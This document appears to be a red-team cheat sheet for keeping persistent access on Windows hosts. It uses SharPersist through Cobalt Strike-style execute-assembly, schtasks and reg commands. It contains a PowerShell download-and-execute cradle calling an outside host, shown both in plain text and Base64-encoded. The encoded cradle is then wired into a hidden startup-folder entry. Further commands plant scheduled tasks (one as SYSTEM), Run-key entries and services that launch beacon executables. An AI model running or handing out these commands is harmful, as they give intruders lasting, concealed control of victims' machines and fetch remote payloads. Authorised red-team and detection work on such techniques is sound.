### SharPersist
https://github.com/mandiant/SharPersist

### Powershell Encoding & Decoding
```powershell
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
```powershell
$Encoded="SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))

```

### Task Scheduler
```powershell
execute-assembly /root/SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Name" -m add -o hourly
execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m list
execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m remove
```

### Startup Folder
```powershell
execute-assembly /root/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "Name" -m add
execute-assembly /root/SharPersist.exe -t startupfolder -m list
execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
```

### Registry AutoRun (Admin Access for "hklmrun")
```powershell
execute-assembly /root/SharPersist.exe -t reg -c "C:\Windows\System32\beacon.exe" -k "hkcurun" -v "Name" -m add
execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -v "Name" -m remove
execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -m list
```

### Windows Service (Admin Access)
```powershell
execute-assembly /root/SharPersist.exe -t service -c "C:\Windows\System32\beacon-svc.exe" -n "Name" -m add
execute-assembly /root/SharPersist.exe -t service -n "Name" -m list
execute-assembly /root/SharPersist.exe -t service -n "Name" -m remove
```

### Task Scheduler (schtasks)
```powershell
shell schtasks /create /sc minute /mo 1 /tn cool /tr "copy /Y C:\Users\Hassan\long.exe C:\Users\Hassan\short.exe & C:\Users\Hassan\short.exe"
shell schtasks /query /tn cool /V /FO LIST
shell schtasks /run /tn "cool"
shell schtasks /delete /tn "cool"
shell schtasks /create /sc onlogon /tn evil /tr calc.exe /ru SYSTEM
```

### Registry AutoRun (reg)
```powershell
shell reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d calc.exe
shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d calc.exe
shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
```
